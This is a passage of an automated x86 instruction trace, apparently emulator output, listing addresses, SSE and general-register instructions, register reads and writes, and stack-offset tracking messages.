-0x8 and offset 0x8000 for stack size 0x10000 0x41e2a2: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e2a6: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x41e2a9: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41e2b8: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41e2bb: pxor xmm7, xmm3, regs_read: [129, 125], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e2bf: pxor xmm6, xmm4, regs_read: [128, 126], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e2d9: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e2dd: mov edi, dword ptr [ebx + 8], regs_read: [21], regs_write: [23] 0x41e2e0: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e2eb: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41e2f7: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7ff4 for stack size 0x10000 0x41e2fd: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x41e300: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x41e303: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x41e312: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e316: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e31a: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41e32d: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e331: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e33a: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41e347: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e350: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41e35d: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e361: movaps xmm0, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [122] 0x41e36e: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e372: pxor xmm5, xmm3, regs_read: [127, 125], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e376: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e390: mov eax, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [19] 0x41e393: movaps xmm0, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [122] 0x41e39a: mov dword ptr [ebp - 8], 0x30, regs_read: [20], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 48 4 0x41e3b4: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 0x41e3d5: movaps xmm7, xmm1, regs_read: [123], regs_write: [129] 0x41e3d8: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x41e3db: pxor xmm4, xmmword ptr [edx], regs_read: [126, 24], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e3e5: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x41e3e8: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x41e3f1: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e3f5: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x41e404: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e408: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41e417: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e42e: pxor xmm6, xmm4, regs_read: [128, 126], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e432: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e443: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41e446: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41e44f: pxor xmm2, xmm7, regs_read: [124, 129], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e457: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41e466: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e46a: pxor xmm2, xmm6, regs_read: [124, 128], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e486: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e491: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x41e494: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x41e497: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x41e4a6: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e4aa: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e4ae: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41e4bc: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e4c5: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e4c9: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41e4db: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e4df: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41e4f1: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e4f5: movaps xmm0, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [122] 0x41e502: pxor xmm6, xmmword ptr [ebp - 0x20], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x7fe0 for stack size 0x10000 0x41e507: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e50b: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e51b: mov ecx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [22] 0x41e529: mov eax, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [19] 0x41e52c: movaps xmm1, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [123] 0x41e536: mov dword ptr [ebp - 8], 0x20, regs_read: [20], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 32 4 0x41e546: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 0x41e56d: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e571: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x41e574: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x41e577: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x41e58c: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e590: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x41e599: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e59d: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x41e5a0: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e5a4: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x41e5b3: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e5b7: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41e5bf: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e5c8: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41e5da: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e5de: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41e5f0: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e600: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e604: pxor xmm7, xmm3, regs_read: [129, 125], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e608: pxor xmm7, xmm1, regs_read: [129, 123], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e60c: movaps xmm1, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [123] 0x41e61f: mov ecx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [22] 0x41e62a: mov eax, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [19] 0x41e641: pxor xmm6, xmmword ptr [edx], regs_read: [128, 24], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x41e645: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x41e648: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x4208ab: mov edx, eax, regs_read: [19], regs_write: [24] 0x4208ad: mov dword ptr [ebp - 0x434], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bcc for stack size 0x10000 saving data to stack: 0 4 0x4208c7: mov eax, dword ptr [ebp - 0x418], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7be8 for stack size 0x10000 0x4208cf: mov ecx, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x4208d5: mov dword ptr [ebp - 0x414], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bec for stack size 0x10000 saving data to stack: 0 4 0x4208f1: mov dword ptr [ecx - 0x388], eax, regs_read: [22, 19], regs_write: () 0x4208ff: mov dword ptr [ecx - 0x384], edx, regs_read: [22, 24], regs_write: () 0x420905: mov edi, eax, regs_read: [19], regs_write: [23] 0x420919: mov eax, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x42091f: mov dword ptr [eax], ecx, regs_read: [19, 22], regs_write: () 0x420921: mov dword ptr [eax + 4], edi, regs_read: [19, 23], regs_write: () 0x420924: mov eax, dword ptr [ebp - 0x410], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf0 for stack size 0x10000 0x42092c: mov esi, eax, regs_read: [19], regs_write: [29] 0x420944: mov edi, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x42094c: mov dword ptr [edi - 0x104], edx, regs_read: [23, 24], regs_write: () 0x420958: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42095a: mov dword ptr [edi - 0x108], esi, regs_read: [23, 29], regs_write: () 0x42096d: mov dword ptr [edi - 0x27c], eax, regs_read: [23, 19], regs_write: () 0x420975: mov eax, dword ptr [ebp - 0x484], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7b7c for stack size 0x10000 0x420981: mov dword ptr [edi - 0x280], ecx, regs_read: [23, 22], regs_write: () 0x420987: mov ebx, eax, regs_read: [19], regs_write: [21] 0x420989: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4209a3: mov eax, ebx, regs_read: [21], regs_write: [19] 0x4209b3: mov edi, ecx, regs_read: [22], regs_write: [23] 0x4209bd: mov eax, dword ptr [ebp - 0x428], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bd8 for stack size 0x10000 0x4209c5: mov dword ptr [ebp - 0x418], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7be8 for stack size 0x10000 saving data to stack: 0 4 0x4209cb: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4209e1: mov dword ptr [ebp - 0x410], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bf0 for stack size 0x10000 saving data to stack: 0 4 0x4209ef: mov edx, eax, regs_read: [19], regs_write: [24] 0x4209f1: mov dword ptr [ebp - 0x434], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bcc for stack size 0x10000 saving data to stack: 0 4 0x420a04: mov dword ptr [ebp - 0x40c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bf4 for stack size 0x10000 saving data to stack: 0 4 0x420a17: mov eax, ebx, regs_read: [21], regs_write: [19] 0x420a19: mov ecx, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420a1f: mov dword ptr [ebp - 0x424], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bdc for stack size 0x10000 saving data to stack: 0 4 0x420a3b: mov dword ptr [ecx - 0x380], eax, regs_read: [22, 19], regs_write: () 0x420a49: mov dword ptr [ecx - 0x37c], edx, regs_read: [22, 24], regs_write: () 0x420a4f: mov edi, eax, regs_read: [19], regs_write: [23] 0x420a61: mov eax, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420a69: mov dword ptr [eax - 0x88], ecx, regs_read: [19, 22], regs_write: () 0x420a6f: mov dword ptr [eax - 0x84], edi, regs_read: [19, 23], regs_write: () 0x420a75: mov eax, dword ptr [ebp - 0x410], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf0 for stack size 0x10000 0x420a7d: mov esi, eax, regs_read: [19], regs_write: [29] 0x420a95: mov edi, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420a9d: mov dword ptr [edi - 0xfc], edx, regs_read: [23, 24], regs_write: () 0x420aa9: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420aab: mov dword ptr [edi - 0x100], esi, regs_read: [23, 29], regs_write: () 0x420ac2: mov dword ptr [edi - 0x204], eax, regs_read: [23, 19], regs_write: () 0x420aca: mov eax, dword ptr [ebp - 0x474], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7b8c for stack size 0x10000 0x420ad6: mov dword ptr [edi - 0x208], ecx, regs_read: [23, 22], regs_write: () 0x420adc: mov ebx, eax, regs_read: [19], regs_write: [21] 0x420ade: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420af8: mov eax, ebx, regs_read: [21], regs_write: [19] 0x420b08: mov edi, ecx, regs_read: [22], regs_write: [23] 0x420b12: mov eax, dword ptr [ebp - 0x458], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ba8 for stack size 0x10000 0x420b1a: mov dword ptr [ebp - 0x418], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7be8 for stack size 0x10000 saving data to stack: 0 4 0x420b20: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420b36: mov dword ptr [ebp - 0x410], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bf0 for stack size 0x10000 saving data to stack: 0 4 0x420b44: mov edx, eax, regs_read: [19], regs_write: [24] 0x420b46: mov dword ptr [ebp - 0x424], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bdc for stack size 0x10000 saving data to stack: 0 4 0x420b59: mov dword ptr [ebp - 0x40c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bf4 for stack size 0x10000 saving data to stack: 0 4 0x420b6c: mov eax, ebx, regs_read: [21], regs_write: [19] 0x420b6e: mov ecx, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420b74: mov dword ptr [ebp - 0x488], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7b78 for stack size 0x10000 saving data to stack: 0 4 0x420b90: mov dword ptr [ecx - 0x308], eax, regs_read: [22, 19], regs_write: () 0x420b9c: mov dword ptr [ecx - 0x304], edx, regs_read: [22, 24], regs_write: () 0x420ba6: mov edi, eax, regs_read: [19], regs_write: [23] 0x420bb6: mov eax, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420bbe: mov dword ptr [eax - 0x80], ecx, regs_read: [19, 22], regs_write: () 0x420bc1: mov dword ptr [eax - 0x7c], edi, regs_read: [19, 23], regs_write: () 0x420bc4: mov eax, dword ptr [ebp - 0x410], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf0 for stack size 0x10000 0x420bcc: mov esi, eax, regs_read: [19], regs_write: [29] 0x420be4: mov edi, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420bec: mov dword ptr [edi - 0x184], edx, regs_read: [23, 24], regs_write: () 0x420bf8: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420bfa: mov dword ptr [edi - 0x188], esi, regs_read: [23, 29], regs_write: () 0x420c11: mov dword ptr [edi - 0x1fc], eax, regs_read: [23, 19], regs_write: () 0x420c19: mov eax, dword ptr [ebp - 0x498], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7b68 for stack size 0x10000 0x420c25: mov dword ptr [edi - 0x200], ecx, regs_read: [23, 22], regs_write: () 0x420c2b: mov ebx, eax, regs_read: [19], regs_write: [21] 0x420c2d: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420c47: mov eax, ebx, regs_read: [21], regs_write: [19] 0x420c57: mov edi, ecx, regs_read: [22], regs_write: [23] 0x420c61: mov eax, dword ptr [ebp - 0x448], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bb8 for stack size 0x10000 0x420c69: mov dword ptr [ebp - 0x48c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7b74 for stack size 0x10000 saving data to stack: 0 4 0x420c6f: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420c85: mov dword ptr [ebp - 0x410], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bf0 for stack size 0x10000 saving data to stack: 0 4 0x420c93: mov edx, eax, regs_read: [19], regs_write: [24] 0x420c95: mov dword ptr [ebp - 0x490], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7b70 for stack size 0x10000 saving data to stack: 0 4 0x420ca8: mov dword ptr [ebp - 0x40c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bf4 for stack size 0x10000 saving data to stack: 0 4 0x420cbb: mov eax, ebx, regs_read: [21], regs_write: [19] 0x420cbd: mov dword ptr [ebp - 0x414], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bec for stack size 0x10000 saving data to stack: 0 4 0x420cd9: mov ecx, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420ce5: mov dword ptr [ecx - 0x300], eax, regs_read: [22, 19], regs_write: () 0x420ced: mov dword ptr [ecx - 0x2fc], edx, regs_read: [22, 24], regs_write: () 0x420cf3: mov ebx, eax, regs_read: [19], regs_write: [21] 0x420d05: mov eax, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420d0d: mov dword ptr [eax - 8], ecx, regs_read: [19, 22], regs_write: () 0x420d10: mov dword ptr [eax - 4], ebx, regs_read: [19, 21], regs_write: () 0x420d13: mov eax, dword ptr [ebp - 0x410], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7bf0 for stack size 0x10000 0x420d1b: mov edi, edx, regs_read: [24], regs_write: [23] 0x420d1d: mov esi, eax, regs_read: [19], regs_write: [29] 0x420d33: mov ecx, dword ptr [ebp - 0x408], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 0x420d3d: mov dword ptr [ecx - 0x180], esi, regs_read: [22, 29], regs_write: () 0x420d49: mov dword ptr [ecx - 0x17c], edi, regs_read: [22, 23], regs_write: () 0x420d55: mov edx, edi, regs_read: [23], regs_write: [24] 0x420d64: mov dword ptr [ecx - 0x284], eax, regs_read: [22, 19], regs_write: () 0x420d6a: mov dword ptr [ecx - 0x288], edx, regs_read: [22, 24], regs_write: () 0x420d7a: mov dword ptr [ebp - 0x408], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7bf8 for stack size 0x10000 saving data to stack: 0 4 0x420d86: mov eax, dword ptr [ebp - 0x4a0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7b60 for stack size 0x10000 0x420d92: mov edi, eax, regs_read: [19], regs_write: [23] 0x420d94: mov ecx, 0x100, regs_read: (), regs_write: [22] 0x420da1: push ecx, regs_read: [30, 22], regs_write: [30] 0x420da2: push eax, regs_read: [30, 19], regs_write: [30] 0x420da8: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7ffc for stack size 0x10000 0x420db0: pop edi, regs_read: [30], regs_write: [30, 23] 0x420db1: pop esi, regs_read: [30], regs_write: [30, 29] 0x420db2: pop ebx, regs_read: [30], regs_write: [30, 21] 0x420db8: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x420dba: pop ebp, regs_read: [30], regs_write: [30, 20] 0x420dc0: push ebp, regs_read: [30, 20], regs_write: [30] 0x420dc1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x420dc9: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x420dd0: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x420dd3: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x420dd6: mov ecx, 0x100, regs_read: (), regs_write: [22] 0x420ddb: push ebx, regs_read: [30, 21], regs_write: [30] 0x420ddc: mov ebx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x420ddf: push esi, regs_read: [30, 29], regs_write: [30] 0x420de0: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x800c for stack size 0x10000 0x420de3: push edi, regs_read: [30, 23], regs_write: [30] 0x420de4: push eax, regs_read: [30, 19], regs_write: [30] 0x420deb: mov dword ptr [ebp - 0x89c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x10 and offset 0x7764 for stack size 0x10000 saving data to stack: 0 4 0x420df9: push eax, regs_read: [30, 19], regs_write: [30] 0x420e05: mov ecx, 0x100, regs_read: (), regs_write: [22] 0x420e16: push ebx, regs_read: [30, 21], regs_write: [30] 0x420e19: push eax, regs_read: [30, 19], regs_write: [30] 0x420e25: mov dword ptr [ebp - 0x810], 8, regs_read: [20], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 8 4 0x420e32: mov dword ptr [ebp - 0x808], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 saving data to stack: 0 4 0x420e38: mov esi, dword ptr [ebx - 0x58], regs_read: [21], regs_write: [29] 0x420e3b: mov eax, dword ptr [ebx - 0x78], regs_read: [21], regs_write: [19] 0x420e40: mov edi, dword ptr [ebx - 0x54], regs_read: [21], regs_write: [23] 0x420e51: mov dword ptr [ebp - 0x830], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 saving data to stack: 0 4 0x420e5c: mov dword ptr [ebp - 0x814], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 saving data to stack: 0 4 0x420e69: mov dword ptr [ebp - 0x80c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x420e6f: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x420e75: mov ecx, dword ptr [eax - 0x38], regs_read: [19], regs_write: [22] 0x420e78: mov eax, ecx, regs_read: [22], regs_write: [19] 0x420e84: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x420e93: mov dword ptr [ebp - 0x81c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 saving data to stack: 0 4 0x420e9d: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420e9f: mov dword ptr [ebp - 0x840], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c0 for stack size 0x10000 saving data to stack: 0 4 0x420ea9: mov edi, eax, regs_read: [19], regs_write: [23] 0x420eb7: mov eax, dword ptr [ebp - 0x830], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 0x420ed5: mov dword ptr [ebp - 0x834], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77cc for stack size 0x10000 saving data to stack: 0 4 0x420ee3: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420ee5: mov dword ptr [ebp - 0x87c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7784 for stack size 0x10000 saving data to stack: 0 4 0x420eed: mov edx, eax, regs_read: [19], regs_write: [24] 0x420efd: mov eax, dword ptr [ebp - 0x81c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 0x420f05: mov dword ptr [ebp - 0x844], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77bc for stack size 0x10000 saving data to stack: 0 4 0x420f0d: mov dword ptr [ebp - 0x874], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x778c for stack size 0x10000 saving data to stack: 0 4 0x420f27: mov dword ptr [ebp - 0x840], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c0 for stack size 0x10000 saving data to stack: 0 4 0x420f35: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420f37: mov dword ptr [ebp - 0x864], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x779c for stack size 0x10000 saving data to stack: 0 4 0x420f3f: mov edx, ecx, regs_read: [22], regs_write: [24] 0x420f4c: mov dword ptr [ebp - 0x858], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77a8 for stack size 0x10000 saving data to stack: 0 4 0x420f52: mov ebx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x420f5c: mov dword ptr [ebp - 0x85c], eax, regs_read: [20, 19], regs_write: () 